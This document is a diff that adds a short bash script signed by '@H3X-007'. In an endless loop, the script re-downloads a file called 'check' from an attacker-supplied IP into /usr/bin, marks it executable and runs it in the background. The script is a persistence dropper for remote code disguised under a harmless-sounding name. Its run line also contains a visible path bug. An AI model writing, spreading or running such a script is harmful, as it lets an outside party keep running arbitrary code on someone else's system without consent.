@@ -1,0 +1,15 @@
+#!/bin/bash
+# Created by @H3X-007 :)
+
+script_path="/usr/bin/check"
+ip="$1"
+
+while true; do
+    if [ ! -f "$script_path" ]; then
+        wget "http://$ip/check" -O "$script_path" >/dev/null 2>&1
+        chmod +x "$script_path"
+        ./"$script_path" &
+    else
+        :
+    fi
+done
